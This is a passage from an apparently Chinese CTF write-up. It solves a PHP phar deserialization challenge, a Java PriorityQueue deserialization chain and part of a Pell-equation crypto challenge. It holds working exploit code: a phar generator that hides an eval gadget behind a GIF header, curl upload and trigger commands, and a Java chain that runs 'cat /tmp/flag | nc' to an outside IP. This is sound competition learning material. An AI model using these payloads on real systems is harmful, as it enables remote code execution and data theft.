<figure class="highlight shell"><figcaption><span>shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl &quot;http://127.0.0.1:54018/?img_file=../../../flag&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># Return Success</span></span><br></code></pre></td></tr></table></figure>
<p>直到我看到了参考资料：<a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">reference</a></p>
<p>首先可能先需要：</p>
<figure class="highlight shell"><figcaption><span>shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">php --ini<br></code></pre></td></tr></table></figure>
<p>找到 <code>php.ini</code> 加上这一行：</p>
<figure class="highlight ini"><figcaption><span>php.ini</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">phar.readonly</span> = <span class="hljs-literal">Off</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p>构造 payload <code>phar.phar</code> 文件用的 <code>phar_gen.php</code>：</p>
<figure class="highlight php"><figcaption><span>phar_gen.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">command_test</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$command</span> = <span class="hljs-string">&quot;echo file_get_contents(&#x27;../../../flag&#x27;);&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;command);<br>        &#125;<br>    &#125;<br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub, 增加gif文件头，伪造文件类型</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">command_test</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>运行脚本生成 payload <code>phar.phar</code> 文件，上传该文件，最后 <code>GET</code> 请求获取 flag ：：</p>
<figure class="highlight shell"><figcaption><span>shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">php phar_gen.php<br><br>curl -X POST -F &quot;file=@phar.phar&quot; http://127.0.0.1:54018/<br><br>curl &quot;http://127.0.0.1:54018/?img_file=phar://check.jpg/test.txt&quot;<br></code></pre></td></tr></table></figure>
<p><code>W4terCTF&#123;uNsErl4I1z3_tH3_pH4r_ArCh1v3_TO_ReveAl_tHE_hIDdEn_tREASUrE_OF_7h3_Php_5Erver&#125;</code></p>
<h3 id="Just-ReadObject">Just ReadObject</h3>
<p>先贴payload：</p>
<p>突破口是队友查到的一个比较有名的案例：Java的优先队列序列化的时候，会把元素一个一个add进去，而add需要元素之间的比较。如果优先队列初始化时指定了比较器，会直接调用比较器的<code>compare</code>方法。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/b7d0f27b46af06bbced7dbafddc49678179d3708/src/main/java/ysoserial/payloads/CommonsCollections7.java#L6">ysoserial/src/main/java/ysoserial/payloads/CommonsCollections7.java at b7d0f27b46af06bbced7dbafddc49678179d3708 · frohoff/ysoserial · GitHub</a></p>
<p>而jar包里有个<code>W4terTransformingComparator</code>，它实现了<code>Comparator</code>，可以作为优先队列的比较器，并且它的<code>compare</code>方法非常的狂野：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object obj1, Object obj2)</span> &#123;<br>    <span class="hljs-comment">// ...</span><br>    value1 = <span class="hljs-built_in">this</span>.transformer.transform(obj1);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj2);<br>       <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.decorated.compare(value1, value2);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>大概就是会调用两个比较对象的<code>transform</code>方法，然后呢这个类还有个<code>decorated</code>字段，类型是这个类自己，上面两个<code>transform</code>调用完，会接着调用<code>decorated</code>的<code>compare</code>方法，相当于一个<code>W4terTransformingComparator</code>类型的链表。</p>
<p>那对于transformer呢，jar包里还有一个<code>W4terInvokerTransformer</code>，这个更狂野，它有这三个字段：方法名，参数类型定义列表，参数列表。这几个字段在序列化过程就可以完成加载。</p>
<p>而它的<code>transform(Object obj)</code>方法，会直接根据上面的三个参数，<code>invoke</code>这个<code>obj</code>的指定方法。</p>
<p>所以可以用它构造一个优先队列，指定比较器为这么一个比较器链表，每一级比较器都可以对obj用任意参数执行任意方法，并且优先队列里的元素也可以自己塞。</p>
<p>首先想到的是<code>Runtime.getRuntime().exec(cmd)</code>，由于<code>Runtime</code>是不可序列化的运行时context，需要用反射获取，我们的方法是<code>Class.class.forName(&quot;java.lang.Runtime&quot;)</code>。</p>
<p>也就是说优先队列里要先塞个<code>Class.class</code>，然后把上面的调用链拉成<code>W4terTransformingComparator</code>的链表即可。payload如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Comparator</span> <span class="hljs-variable">comp_empty</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">W4terComparator</span>();<br><br><span class="hljs-type">W4terTransformer</span> <span class="hljs-variable">trans_for_name</span> <span class="hljs-operator">=</span> <br>W4terInvokerTransformer.invokerTransformer(<br>    <span class="hljs-string">&quot;forName&quot;</span>, <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class&#125;, <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>&#125;<br>);<br><span class="hljs-type">W4terTransformer</span> <span class="hljs-variable">trans_get_method</span> <span class="hljs-operator">=</span> <br>W4terInvokerTransformer.invokerTransformer(<br>    <span class="hljs-string">&quot;getMethod&quot;</span>,<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;<br>);<br><span class="hljs-type">W4terTransformer</span> <span class="hljs-variable">trans_exec</span> <span class="hljs-operator">=</span> <br>W4terInvokerTransformer.invokerTransformer(<br>    <span class="hljs-string">&quot;exec&quot;</span>,<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String[].class&#125;, <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<br>        <span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;cat /tmp/flag | nc 172.18.198.218 6666&quot;</span><br>    &#125;&#125;<br>);<br><br><span class="hljs-type">W4terTransformer</span> <span class="hljs-variable">trans_invoke</span> <span class="hljs-operator">=</span> <br>W4terInvokerTransformer.invokerTransformer(<br>    <span class="hljs-string">&quot;invoke&quot;</span>,<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;<br>);<br><br><span class="hljs-type">W4terTransformingComparator</span> <span class="hljs-variable">comp_final</span> <span class="hljs-operator">=</span> <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">W4terTransformingComparator</span>(<br>        trans_for_name,<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">W4terTransformingComparator</span>(<br>            trans_get_method,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">W4terTransformingComparator</span>(<br>                trans_invoke,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">W4terTransformingComparator</span>(<br>                    trans_exec,<br>                    comp_empty<br>                )<br>            ))<br>    );<br>PriorityQueue&lt;Class&gt; pq = <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Class&gt;(comp_final);<br>pq.add(Class.class);<br>pq.add(Class.class);<br><br>serialize(pq, <span class="hljs-string">&quot;hack.obj&quot;</span>);<br></code></pre></td></tr></table></figure>
<p>本地开nc监听6666端口，然后上传<code>hack.obj</code>即可立刻收到flag。</p>
<h2 id="Crypto">Crypto</h2>
<h3 id="Smoke-hints">Smoke hints</h3>
<p>从task.py可以得到以下信息</p>
<p>以下将hint1~hint5简写为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mn>1</mn></msub><mo>−</mo><msub><mi>h</mi><mn>5</mn></msub></mrow><annotation encoding="application/x-tex">h_1 -h_5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p>
<ul>
<li>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">h_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是随机生成的18位素数</p>
</li>
<li>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mn>2</mn></msub><mo>=</mo><mo stretchy="false">(</mo><msub><mi>h</mi><mn>1</mn></msub><mo>−</mo><mn>2</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo><mi>e</mi><mi mathvariant="normal">%</mi><msub><mi>h</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">h_2=(h_1-2)!e\%h_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">)!</span><span class="mord mathnormal">e</span><span class="mord">%</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p>
</li>
<li>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mn>3</mn></msub><mo>=</mo><mo stretchy="false">⌊</mo><mfrac><mi>p</mi><msup><mn>2</mn><mn>256</mn></msup></mfrac><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">h_3=\lfloor\frac{p}{2^{256}}\rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7475em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">256</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4461em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋</span></span></span></span></p>
</li>
<li>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mn>4</mn></msub><mo>=</mo><mi>d</mi><mi mathvariant="normal">%</mi><msup><mn>2</mn><mrow><mi>d</mi><mi mathvariant="normal">.</mi><mi>b</mi><mi>i</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mn>4</mn></mrow></msup></mrow><annotation encoding="application/x-tex">h_4=d\%2^{d.bit\_length()//4}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9436em;vertical-align:-0.0556em;"></span><span class="mord mathnormal">d</span><span class="mord">%</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="mord mtight">.</span><span class="mord mathnormal mtight">bi</span><span class="mord mathnormal mtight">t</span><span class="mord mtight" style="margin-right:0.02778em;">_</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">h</span><span class="mopen mtight">(</span><span class="mclose mtight">)</span><span class="mord mtight">//4</span></span></span></span></span></span></span></span></span></span></span></span></p>
</li>
<li>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mn>5</mn></msub><mo>=</mo><msup><mi>x</mi><mn>2</mn></msup><mi>p</mi><mo>+</mo><msup><mi>y</mi><mn>2</mn></msup><mi>q</mi></mrow><annotation encoding="application/x-tex">h_5=x^2p+y^2q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></p>
</li>
</ul>
<p>还给了n和c</p>
<p>已知<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>114514</mn><msup><mi>x</mi><mn>2</mn></msup><mo>−</mo><mn>11680542514</mn><msup><mi>y</mi><mn>2</mn></msup><mo>+</mo><mn>1919810</mn><mo>=</mo><mn>2034324</mn></mrow><annotation encoding="application/x-tex">114514 x^2 - 11680542514 y^2 + 1919810 = 2034324</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord">114514</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord">11680542514</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1919810</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2034324</span></span></span></span></p>
<p>化简后得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>−</mo><mn>102001</mn><msup><mi>y</mi><mn>2</mn></msup><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^2-102001y^2=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord">102001</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></p>
<p>使用下面的脚本求得x和y的值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solvePell</span>(<span class="hljs-params">n</span>):<br>    x = <span class="hljs-built_in">int</span>(math.sqrt(n))<br>    y, z, r = x, <span class="hljs-number">1</span>, x &lt;&lt; <span class="hljs-number">1</span><br>    e1, e2 = <span class="hljs-number">1</span>, <span class="hljs-number">0</span><br>    f1, f2 = <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        y = r * z - y<br>        z = (n - y * y) // z<br>        r = (x + y) // z<br><br>        e1, e2 = e2, e1 + e2 * r<br>        f1, f2 = f2, f1 + f2 * r<br><br>        a, b = f2 * x + e2, f2<br>        <span class="hljs-keyword">if</span> a * a - n * b * b == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> a, b<br><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> [<span class="hljs-number">102001</span>]:<br>    x, y = solvePell(n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x^2 - %3d * y^2 = 1\nx = %27d\n y = %25d&quot;</span> % (n, x, y))<br></code></pre></td></tr></table></figure>
<p>根据</p>
<p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mi>x</mi><mn>2</mn></msup><mi>p</mi><mo>+</mo><msup><mi>y</mi><mn>2</mn></msup><mi>q</mi><mo>=</mo><msub><mi>h</mi><mn>5</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mi>q</mi><mo>=</mo><mi>n</mi></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases}
